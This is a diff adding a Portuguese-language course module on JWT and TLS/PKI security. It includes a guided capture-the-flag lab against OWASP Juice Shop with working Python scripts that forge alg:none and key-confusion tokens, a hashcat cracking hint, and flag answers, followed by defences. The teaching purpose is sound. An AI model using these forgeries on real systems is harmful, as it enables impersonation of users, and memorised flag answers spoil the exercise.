+O padrão JWT prevê um algoritmo `none`, pensado para tokens que já trafegam por
+um canal seguro. O problema é um servidor que aceita `none` vindo do cliente. O
+ataque é mecânico:
+
+1. Pegue um token legítimo e decodifique o header e o payload (Base64url).
+2. No header, troque o algoritmo para `"alg":"none"`.
+3. No payload, altere a claim que te interessa (o e-mail, o papel).
+4. Remonte o token como `base64url(header).base64url(payload).` — **com o ponto
+   final e a assinatura vazia**.
+
+Se o servidor confia no `alg`, ele vê `none`, conclui que "não há assinatura a
+verificar" e aceita o payload adulterado. Você vira quem quiser, **sem chave
+nenhuma**. É a Missão 1.
+
+### 3.2 Variante B — segredo HS256 fraco
+
+Quando o token é HS256 (simétrico), a assinatura depende de um segredo. Se esse
+segredo for fraco (`secret`, `password`, o nome da empresa), o atacante o
+descobre por dicionário — exatamente a quebra offline do 3.2, agora sobre a
+assinatura de JWT, com ferramentas como o `hashcat` no modo 16500. De posse do
+segredo, ele assina qualquer payload. A defesa é a mesma de qualquer chave:
+comprimento e aleatoriedade (3.1).
+
+### 3.3 Variante C — confusão de chaves RS256 → HS256
+
+Esta é a mais sutil e a mais instrutiva. Suponha um servidor que assina com
+**RS256** (assimétrico): ele assina com a privada e **verifica com a chave
+pública**, que é divulgável de propósito. Muitas bibliotecas antigas expõem uma
+função `verify(token, chave)` que decide o algoritmo pelo `alg` do token. O
+ataque:
+
+1. O atacante troca o header para `"alg":"HS256"` (simétrico).
+2. Assina o token com **HMAC-SHA-256**, usando como segredo a **chave pública**
+   do servidor (que ele conhece — às vezes o próprio app a serve).
+3. O servidor, obediente ao `alg`, chama a verificação HS256 e usa a chave
+   pública como se fosse o segredo HMAC. Como o atacante usou essa mesma chave,
+   a assinatura **confere**.
+
+A falha não está na matemática do RSA nem do HMAC; está em deixar o token
+escolher a **família** do algoritmo, misturando uma chave pública (para
+verificar assinatura assimétrica) com um segredo simétrico (para HMAC). É a
+<GlossaryTerm term="key confusion">confusão de chaves</GlossaryTerm>, e é a
+Missão 2.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### As bibliotecas de JWT e o `alg:none` (março de 2015)
+
+Em **31 de março de 2015**, o pesquisador Jeremy Spilman levou à lista pública
+*oss-security* um aviso com o título "Signature Bypass in several JSON Web Token
+Libraries", e o pesquisador canadense Tim McLean publicou a análise detalhada
+num texto que a Auth0 reproduziu. As duas falhas eram justamente as das variantes
+A e C da seção 3: bibliotecas populares aceitavam `alg:none` (permitindo tokens
+sem assinatura) e sofriam a confusão RS256→HS256 (tratando a chave pública como
+segredo HMAC). Afetava implementações amplamente usadas, entre elas o
+`node-jsonwebtoken`, `pyjwt`, `php-jwt` e `namshi/jose`.
+
+- **Impacto:** em sistemas que usavam as versões vulneráveis, qualquer um podia
+  forjar tokens e se passar por qualquer usuário — o mesmo efeito das suas duas
+  missões, mas em produção. A correção do `node-jsonwebtoken` saiu na versão
+  4.2.2 e virou o **CVE-2015-9235** (classificado como CWE-327, uso de algoritmo
+  criptográfico quebrado ou arriscado), publicado no catálogo do NIST em 9 de
+  outubro de 2018.
+- **Lição:** a biblioteca nunca deve deixar o token escolher o algoritmo. A
+  verificação tem de fixar o algoritmo esperado pelo servidor. É a defesa da
+  seção 8, e a razão de o aviso ser de 2015 e a técnica ainda aparecer em labs e
+  em pentests hoje.
+- **Fonte:** [oss-security — Signature Bypass in several JSON Web Token Libraries (31/03/2015)](https://seclists.org/oss-sec/2015/q2/3)
+  e [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235).
+
+### DigiNotar: quando a âncora de confiança cai (2011)
+
+A autoridade certificadora holandesa DigiNotar **detectou uma invasão em 19 de
+julho de 2011**. Os atacantes usaram o acesso para emitir certificados
+fraudulentos — ao todo pelo menos **531** —, inclusive um `*.google.com` válido
+aos olhos de qualquer navegador. Esse certificado foi usado num ataque
+*man-in-the-middle* que, segundo a investigação da Fox-IT (a "Operation Black
+Tulip", com relatório interino de 5 de setembro de 2011), teve como alvo cerca de
+**300 mil usuários de Gmail no Irã**: o tráfego que eles criam estar protegido
+pelo cadeado do Google era, na verdade, decifrado pelo atacante.
+
+- **Impacto:** como a DigiNotar era uma CA confiável, os certificados falsos
+  passavam sem aviso. A única cura foi drástica: entre o fim de agosto e setembro
+  de 2011, navegadores e sistemas **removeram a raiz da DigiNotar** das listas de
+  confiança — o que invalidou todos os certificados legítimos que ela havia
+  emitido. A empresa foi declarada falida em **20 de setembro de 2011**.
+- **Lição:** a confiança da web é tão forte quanto a CA mais fraca em que o seu
+  navegador confia. O roubo de uma chave de CA não "quebra" a criptografia — ele
+  subverte a PKI, assinando mentiras verdadeiras. Daí a importância da
+  <GlossaryTerm term="certificate revocation">revogação</GlossaryTerm>, do
+  monitoramento de emissões (Certificate Transparency, criado depois justamente
+  por causa disso) e do <GlossaryTerm term="certificate pinning">pinning</GlossaryTerm>.
+- **Fonte:** [DigiNotar — Wikipedia (com citações ao relatório Fox-IT e aos avisos dos navegadores)](https://en.wikipedia.org/wiki/DigiNotar).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá decodificado um JWT real do OWASP Juice
+Shop, entendido cada uma das três partes e forjado dois tokens que o impossível
+— virar usuários que não existem — torna possível: um por `alg:none` (Missão 1)
+e um por confusão de chaves RS256→HS256 (Missão 2). Cada missão rende uma flag.
+
+O laboratório é o **`juice-shop`**: o Kali e o OWASP Juice Shop, uma loja de
+sucos deliberadamente vulnerável mantida pela OWASP, na mesma rede interna. De
+dentro do Kali, o alvo responde em `http://juice-shop:3000/`. Você vai trabalhar
+pelo terminal do Kali, com `curl`, `python3` e `openssl` — tudo o que a attack
+box já traz.
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e o Juice Shop. Se outro lab estiver no ar, o botão vira
+**Trocar para este lab**. Feche o que não estiver usando no Windows antes de
+subir.
+</Callout>
+
+### 5.1 Subir o lab e preparar a bancada (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se a
+   plataforma avisar que faltam imagens, rode no terminal do WSL
+   `scripts/lab.sh pull juice-shop` (único momento com internet) e tente de novo.
+   Pelo terminal, a alternativa para ligar é `scripts/lab.sh up juice-shop`.
+2. Quando o desktop do Kali aparecer, clique nele, abra um terminal e crie a
+   pasta de evidências:
+
+```console
+$ umask 077
+$ mkdir -p ~/engajamentos/lab-3.4_juice-shop/evidencias
+$ cd ~/engajamentos/lab-3.4_juice-shop/evidencias
+```
+
+3. Confirme que o alvo responde e guarde a versão como evidência:
+
+```console
+$ curl -s http://juice-shop:3000/rest/admin/application-version
+{"version":"20.2.0"}
+```
+
+### 5.2 A carta de autorização do exercício
+
+<Callout variant="info" title="Autorização — exercício 3.4 (laboratório local)">
+**Ativo autorizado:** a aplicação `http://juice-shop:3000/` do lab `juice-shop`.
+
+**Técnicas autorizadas:** decodificação e forja de JWT (alg:none e confusão de
+chaves) contra o Juice Shop, pelo terminal do Kali.
+
+**Fora do escopo:** qualquer outro host (o `guacd`, o próprio Kali) e qualquer
+sistema fora do laboratório. Nada de testar estas técnicas em sites reais.
+</Callout>
+
+### 5.3 Reconhecimento — pegar e abrir um token legítimo (guiado)
+
+Primeiro, um login honesto, para ver como é um token de verdade. O Juice Shop
+tem uma conta de administrador conhecida (`admin@juice-sh.op`, senha `admin123` —
+você quebraria essa senha fraca com o que viu em 3.2). Faça o login pela API e
+guarde o token:
+
+```console
+$ curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" \
+    | tee token.txt
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2Vy...（recortado）
+```
+
+Agora decodifique as três partes. O header e o payload são Base64url; a
+assinatura é bytes, não texto. Esta função ajuda a completar o padding que o
+Base64url omite (o `=` que você viu no 3.1):
+
+```console
+$ b64url() { python3 -c "import sys,base64; s=sys.argv[1]; print(base64.urlsafe_b64decode(s+'='*(-len(s)%4)).decode('utf-8','replace'))" "$1"; }
+$ TOKEN=$(cat token.txt)
+$ b64url "$(echo "$TOKEN" | cut -d. -f1)"
+{"typ":"JWT","alg":"RS256"}
+$ b64url "$(echo "$TOKEN" | cut -d. -f2)"
+{"data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin",...},"iat":1791221610}
+```
+
+Pare e leia. O header diz `"alg":"RS256"`: o Juice Shop assina com RSA
+(assimétrico). O payload é o objeto do usuário inteiro — inclusive o campo
+`password`, que não é a senha em claro, e sim um **hash de senha**. Olhe para
+ele: `0192023a7bbd73250516f069df18b500`, 32 caracteres hexadecimais. Pelo 3.2,
+isso tem cara de MD5. Confirme que é o MD5 de `admin123`:
+
+```console
+$ echo -n admin123 | md5sum
+0192023a7bbd73250516f069df18b500  -
+```
+
+É ele. Esse hash é a **segunda metade da flag da Missão 1**. (E repare na falha
+de projeto: o Juice Shop coloca o hash da senha dentro do token que entrega ao
+cliente — nunca faça isso.)
+
+### 5.4 Missão 1 — O token sem assinatura (desafio)
+
+**Cenário:** existe no Juice Shop um usuário que não existe. O desafio oficial
+"Unsigned JWT" pede que você forje um token que se passe por
+`jwtn3d@juice-sh.op`. Pela seção 3.1, o caminho é o `alg:none`: um header que diz
+`none`, um payload com o e-mail alvo e **nenhuma assinatura**.
+
+**Seu objetivo:** montar esse token e apresentá-lo numa requisição autenticada
+(por exemplo, `GET /rest/user/whoami`), fazendo o servidor responder com o e-mail
+`jwtn3d@juice-sh.op`. A flag é `FLAG{none-<hash>}`, onde `<hash>` é o hash de
+senha do admin que você achou na seção 5.3.
+
+Pense primeiro: como o servidor lê o token? O Juice Shop aceita o JWT tanto no
+cabeçalho `Authorization: Bearer <token>` quanto no cookie `token`. Mande nos
+dois, para garantir.
+
+<Hint title="Dica 1 — montar o token none">
+O header é `{"alg":"none","typ":"JWT"}`. O payload precisa só do essencial:
+`{"data":{"email":"jwtn3d@juice-sh.op"}}`. Codifique cada um em Base64url **sem
+padding** e junte com pontos, terminando com um ponto e nada depois (a assinatura
+vazia): `header.payload.` — repare no ponto final.
+</Hint>
+
+<Hint title="Dica 2 — enviar e conferir">
+Use o `python3` para montar e já disparar a requisição, mandando o mesmo token no
+header `Authorization: Bearer` e no cookie `token`. Se o `whoami` responder com
+`"email":"jwtn3d@juice-sh.op"`, funcionou. Se vier `{"user":{}}`, o token não foi
+aceito — confira o ponto final e o Base64url sem padding.
+</Hint>
+
+<Solution title="Solução da Missão 1">
+Saída real do lab:
+
+```console
+$ python3 - <<'PY'
+import json, base64, urllib.request
+def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
+header  = {"alg":"none","typ":"JWT"}
+payload = {"data":{"id":1,"email":"jwtn3d@juice-sh.op","role":"admin"}}
+h = b64u(json.dumps(header,separators=(",",":")).encode())
+p = b64u(json.dumps(payload,separators=(",",":")).encode())
+token = f"{h}.{p}."                      # assinatura vazia
+req = urllib.request.Request(
+    "http://juice-shop:3000/rest/user/whoami",
+    headers={"Authorization":"Bearer "+token, "Cookie":"token="+token})
+print(urllib.request.urlopen(req, timeout=10).read().decode())
+PY
+{"user":{"id":1,"email":"jwtn3d@juice-sh.op"}}
+```
+
+O servidor te reconheceu como o usuário inexistente, sem você ter chave nenhuma.
+A flag é `FLAG{none-}` seguida do hash MD5 da senha do admin da seção 5.3 — ou
+seja, `FLAG{none-0192023a7bbd73250516f069df18b500}`.
+</Solution>
+
+<FlagInput task="missao-1-jwt-sem-assinatura" />
+
+### 5.5 Missão 2 — A chave pública virada segredo (desafio)
+
+**Cenário:** o `alg:none` é grosseiro e um servidor minimamente cuidadoso o
+rejeita. A Missão 2 é mais fina. O desafio oficial "Forged Signed JWT" pede um
+token que se passe por `rsa_lord@juice-sh.op` — e o detalhe do nome entrega a
+rota: o Juice Shop assina com **RSA (RS256)** e verifica com a sua chave pública.
+Pela seção 3.3, a confusão de chaves transforma essa chave pública numa arma.
+
+**Seu objetivo:** forjar um token **HS256** cujo payload tenha
+`rsa_lord@juice-sh.op`, assinando-o com HMAC-SHA-256 e usando como segredo a
+**chave pública** do próprio servidor. Primeiro você precisa dessa chave — e o
+Juice Shop, generosamente, a serve. A flag é `FLAG{HS256-<sha256>}`, onde
+`<sha256>` é o hash SHA-256 do arquivo da chave que você usou como segredo.
+
+<Hint title="Dica 1 — achar a chave pública">
+O Juice Shop expõe a pasta `encryptionkeys`. Tente
+`curl http://juice-shop:3000/encryptionkeys/` e veja a listagem; a chave pública
+de JWT está num arquivo `.pub`. Baixe-a para um arquivo e **não a edite**.
+</Hint>
+
+<Hint title="Dica 2 — os bytes exatos importam">
+O segredo HMAC são os **bytes exatos** da chave, como o servidor os lê. Se você
+copiar e colar a chave num editor, pode acabar com uma quebra de linha a mais no
+fim — e aí a assinatura não bate. Baixar com `curl -o` preserva os bytes como o
+servidor os serve. Depois de assinar, confira: o SHA-256 do arquivo é a segunda
+metade da flag.
+</Hint>
+
+<Solution title="Solução da Missão 2">
+Saída real do lab. Primeiro, pegar a chave pública que o próprio alvo serve:
+
+```console
+$ curl -s http://juice-shop:3000/encryptionkeys/jwt.pub -o jwt.pub
+$ cat jwt.pub
+-----BEGIN RSA PUBLIC KEY-----
+MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQR
+ozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/
+iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
+-----END RSA PUBLIC KEY-----
+$ openssl rsa -pubin -RSAPublicKey_in -in jwt.pub -text -noout | head -1
+Public-Key: (1024 bit)
+```
+
+Repare: é uma chave de apenas **1024 bits** — fraca para os padrões de hoje (a
+seção 2.5 pediria 3072). Agora o forjamento, usando o arquivo como segredo HMAC:
+
+```console
+$ python3 - <<'PY'
+import json, base64, hmac, hashlib, urllib.request
+def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
+secret = open("jwt.pub","rb").read()            # os bytes exatos da chave pública
+header  = {"alg":"HS256","typ":"JWT"}
+payload = {"data":{"id":1,"email":"rsa_lord@juice-sh.op","role":"admin"}}
+h = b64u(json.dumps(header,separators=(",",":")).encode())
+p = b64u(json.dumps(payload,separators=(",",":")).encode())
+sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
+token = f"{h}.{p}.{b64u(sig)}"
+req = urllib.request.Request(
+    "http://juice-shop:3000/rest/user/whoami",
+    headers={"Authorization":"Bearer "+token, "Cookie":"token="+token})
+print(urllib.request.urlopen(req, timeout=10).read().decode())
+PY
+{"user":{"id":1,"email":"rsa_lord@juice-sh.op"}}
+```
+
+Funcionou: o servidor verificou um token HS256 usando a chave pública como
+segredo, exatamente a confusão de chaves. A segunda metade da flag é o SHA-256 do
+arquivo que você usou:
+
+```console
+$ sha256sum jwt.pub
+89fdb7cbbc50749d7a72fbf3452e5ba537d01e176b8e686b3f8536627c11f338  jwt.pub
+```
+
+A flag é `FLAG{HS256-89fdb7cbbc50749d7a72fbf3452e5ba537d01e176b8e686b3f8536627c11f338}`.
+Se o seu SHA-256 der diferente, você provavelmente pegou a chave com uma quebra
+de linha a mais no fim — refaça o download com `curl -o`.
+</Solution>
+
+<FlagInput task="missao-2-confusao-de-chaves" />
+
+### 5.6 Walkthrough: as duas falhas vistas pelo defensor (sem flag)
+
+As suas duas missões morreriam com uma linha de código correta: **fixar o
+algoritmo na verificação**. Em vez de `jwt.verify(token, chave)` deixando o
+token decidir, o servidor diria `jwt.verify(token, chavePublica, { algorithms: ['RS256'] })`.
+Com isso, o `alg:none` é recusado (não está na lista) e o HS256 forjado também
+(a lista só aceita RS256, que exige a chave privada que o atacante não tem). A
+seção 8 detalha. Guarde a ideia: nas duas missões, o erro não foi da matemática
+— foi deixar o atacante escolher as regras.
+
+### 5.7 Desligar o laboratório
+
+No painel do lab, clique em **Parar** (libera a vaga de um lab por vez). Para
+refazer as missões do zero (os desafios voltam a "não resolvidos"), use
+**Resetar**, que recria o contêiner do Juice Shop.
+
+## 6. Variações e aprofundamento
+
+**Outras rotas de ataque a JWT.** Além das três da seção 3, há famílias inteiras
+que exploram campos do header que apontam para chaves:
+
+- **`kid` (key id) malicioso:** o header pode trazer um `kid` que diz ao servidor
+  qual chave usar. Se o servidor monta um caminho de arquivo ou uma consulta SQL
+  com esse valor sem sanitizar, cai em path traversal (lê um arquivo conhecido e
+  previsível como chave) ou em SQL injection — assuntos da Trilha 4.
+- **`jku`/`x5u` (URLs de chave):** esses campos apontam para a URL de onde buscar
+  a chave pública. Se o servidor confia na URL do token, o atacante aponta para
+  um servidor seu, com a chave dele, e assina à vontade. A defesa é uma allowlist
+  de URLs.
+
+**Recuperar a chave pública quando o app não a serve.** No lab, o Juice Shop
+entregou a chave em `/encryptionkeys/jwt.pub`. Num alvo real, nem sempre é assim —
+mas, se você tem dois tokens RS256 assinados pela mesma chave, existe
+ferramenta (como a `jwt_forgery`/`rsa_sign2n`) que reconstrói a chave pública RSA
+a partir das assinaturas. Ou seja, "a chave pública é secreta" nunca é uma
+defesa.
+
+**TLS: downgrade e versões velhas.** Assim como o token não deve escolher o
+algoritmo, a conexão não deve aceitar protocolos fracos. Ataques de *downgrade*
+tentam empurrar cliente e servidor para versões antigas e quebráveis. Por isso o
+TLS 1.0 e o 1.1 foram formalmente **depreciados pelo RFC 8996, de março de
+2021**: faltava-lhes suporte a algoritmos atuais. Hoje o mínimo aceitável é o TLS
+1.2, e o alvo é o 1.3.
+
+**mTLS.** Em ambientes internos (microsserviços, APIs entre empresas), usa-se o
+<GlossaryTerm term="mutual TLS">TLS mútuo</GlossaryTerm>: além do servidor, o
+**cliente** também apresenta um certificado, e os dois lados se autenticam. É uma
+camada a mais que um Bearer token roubado não vence sozinho.
+
+**Gancho para o 3.5.** Toda a segurança de RSA, Diffie-Hellman e ECC repousa em
+dois problemas difíceis: fatorar e o logaritmo discreto. Um computador quântico
+grande o bastante resolveria os dois (o algoritmo de Shor). É disso que trata o
+próximo módulo — a criptografia pós-quântica e o "colher agora, decifrar depois".
+
+## 7. Erros comuns
+
+- **Confundir cifrar com assinar.** O erro nº 1. Cifrar para alguém usa a chave
+  **pública de quem recebe**; assinar usa a chave **privada de quem envia**. Se
+  você se pegar "cifrando com a privada", pare: isso é assinar.
+- **Achar que o payload do JWT é secreto.** Não é. Base64url é encoding (3.1).
+  Nunca ponha segredo no payload — o Juice Shop errou ao pôr o hash da senha lá.
+- **Esquecer o ponto final no `alg:none`.** O token é `header.payload.` — com o
+  ponto e a assinatura vazia. Sem o ponto, o parser rejeita o formato.
+- **Padding do Base64url.** O JWT omite o `=`. Ao decodificar à mão, complete o
+  padding (`'='*(-len(s)%4)`), senão o decoder reclama.
+- **Bytes errados na chave-segredo (Missão 2).** Uma quebra de linha a mais no
+  fim do arquivo muda o segredo HMAC e a assinatura não bate. Baixe com
+  `curl -o`, não copie e cole.
+- **Tratar tamanho de chave entre famílias.** "Minha chave tem 256 bits, é forte"
+  — depende. 256 bits de ECC equivalem a 3072 de RSA; 256 bits de RSA não
+  protegem nada. Tamanho só se compara dentro da mesma família (2.5).
+- **Token expirado.** Em tokens com `exp`, um relógio fora de hora ou um `exp`
+  velho fazem a verificação falhar por um motivo que não é o seu ataque. No lab,
+  os tokens forjados não precisam de `exp`.
+
+## 8. Defesa e mitigação
+
+A lição das duas missões cabe numa frase: **o servidor, não o token, decide como
+verificar.** Em concreto:
+
+**1. Fixe o algoritmo na verificação.** Nunca chame uma função que escolhe o
+algoritmo pelo `alg` do token. Declare a lista do que você aceita:
+
+```javascript
+// ERRADO: o token escolhe o algoritmo
+jwt.verify(token, key)
+
+// CERTO: o servidor fixa o algoritmo esperado
+jwt.verify(token, publicKey, { algorithms: ['RS256'] })
+```
+
+Com `algorithms: ['RS256']`, o `alg:none` é recusado (não está na lista) e o
+HS256 forjado também (exigiria a chave privada). As duas missões morrem aqui.
+
+**2. Nunca aceite `alg:none` de entrada.** Se a sua biblioteca permite `none`,
+desligue. Não existe caso de uso legítimo para aceitar um token sem assinatura
+vindo do cliente.
+
+**3. Separe as chaves por uso.** Chave de assinatura RSA/ECDSA é uma coisa;
+segredo HMAC é outra. Nunca use o mesmo material de chave para os dois, e nunca
+exponha nada que sirva de segredo HMAC (a confusão de chaves vive dessa mistura).
+
+**4. Segredos HMAC fortes.** Se usar HS256, o segredo é uma chave: longo e
+aleatório, de um CSPRNG (3.1), nunca uma palavra. Senão, cai por dicionário (3.2).
+
+**5. Valide as claims, não só a assinatura.** Depois de verificar a assinatura,
+cheque `exp` (validade), `iss` (emissor) e `aud` (destinatário). Uma assinatura
+válida de um token legítimo para **outro** serviço não deve valer no seu.
+
+**6. Não ponha segredo no payload.** Ele é legível. Guarde ali só o necessário
+para identificar e autorizar — nunca senhas, hashes ou dados sensíveis.
+
+**Do lado do TLS e da PKI**, a defesa é de configuração:
+
+- **Versões e cifras:** exija TLS 1.2 no mínimo, prefira 1.3; desligue 1.0/1.1
+  (RFC 8996) e cifras sem forward secrecy.
+- **HSTS:** o cabeçalho <GlossaryTerm term="HSTS">HSTS</GlossaryTerm> (2.5) manda
+  o navegador só falar por HTTPS, fechando o downgrade para HTTP.
+- **Certificados:** chaves de 2048 bits de RSA ou 256 de ECC no mínimo (2.5),
+  validade curta, e monitore emissões (Certificate Transparency) — a resposta do
+  ecossistema ao DigiNotar.
+- **Revogação e rotação:** tenha como revogar uma chave comprometida (OCSP/CRL) e
+  rotacione as chaves de assinatura de JWT periodicamente.
+
+## 9. Exercícios
+
+Responda ao quiz abaixo. Ele cobre a teoria (troca de chaves, par de chaves,
+certificados, handshake) e as duas falhas de JWT que você explorou. Cada resposta
+vem com a explicação do porquê.
+
+<Quiz task="quiz-final" />
+
+### Desafios práticos (sem flag)
+
+1. **O token do `rsa_lord` sem a confusão.** Tente forjar o token da Missão 2
+   usando `alg:none` em vez de HS256. Ele resolve o desafio "Forged Signed JWT"?
+   Por que o desafio distingue os dois casos? (Dica: releia a seção 3 e pense no
+   que cada desafio quer provar.)
+2. **Leia um certificado real.** No seu WSL (fora do lab, com internet), rode
+   `openssl s_client -connect example.com:443 </dev/null | openssl x509 -noout -issuer -subject -dates`.
+   Identifique o emissor (a CA), o dono (o domínio) e a validade. Depois siga a
+   cadeia: quem assinou a CA que assinou o `example.com`?
+3. **Forward secrecy na prática.** Explique, em três linhas, por que gravar hoje
+   o tráfego TLS 1.3 de alguém e roubar a chave privada do servidor amanhã **não**
+   decifra a conversa de hoje. Qual peça do handshake garante isso?
+
+## 10. Resumo e glossário
+
+A criptografia assimétrica resolve o que a simétrica não resolve sozinha: combinar
+uma chave secreta por um canal escutado e provar identidade. De um par de chaves
+saem dois usos opostos — cifrar para alguém (com a pública de quem recebe) e
+assinar (com a privada de quem envia) —, e trocá-los é a raiz de metade dos erros.
+O TLS costura tudo: ECDHE para a chave, certificado e assinatura para a
+identidade, AES-GCM para os dados. O JWT leva a assinatura para dentro das
+aplicações, e quebra sempre pelo mesmo motivo — deixar o token escolher como será
+verificado, seja por `alg:none`, por segredo fraco ou por confusão de chaves. A
+defesa, nos dois mundos, é tirar essa escolha das mãos de quem ataca: o servidor
+fixa o algoritmo, a conexão fixa a versão, e a PKI fixa em quem confiar.
+
+### Cola rápida: qual chave para quê
+
+- **Cifrar para alguém:** a chave **pública** de quem recebe. Só a privada dele lê.
+- **Assinar:** a chave **privada** de quem envia. Qualquer um verifica com a pública.
+- **Troca de chave (TLS):** ECDHE — segredo derivado em público, efêmero (forward secrecy).
+- **JWT verificação:** fixe `algorithms` no servidor; jamais aceite `none`.
+- **Tamanho:** só compare dentro da família. AES-128 ≈ RSA-3072 ≈ ECC-256.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [RFC 8446 — The Transport Layer Security (TLS) Protocol Version 1.3](https://www.rfc-editor.org/rfc/rfc8446)
+  (a especificação do TLS 1.3).
+- [RFC 8996 — Deprecating TLS 1.0 and TLS 1.1](https://www.rfc-editor.org/rfc/rfc8996).
+- [OWASP Juice Shop — projeto oficial](https://owasp.org/www-project-juice-shop/).
+- [NIST SP 800-57 Part 1 — Recommendation for Key Management](https://csrc.nist.gov/pubs/sp/800/57/pt1/r5/final)
+  (a tabela de equivalência de tamanhos de chave).
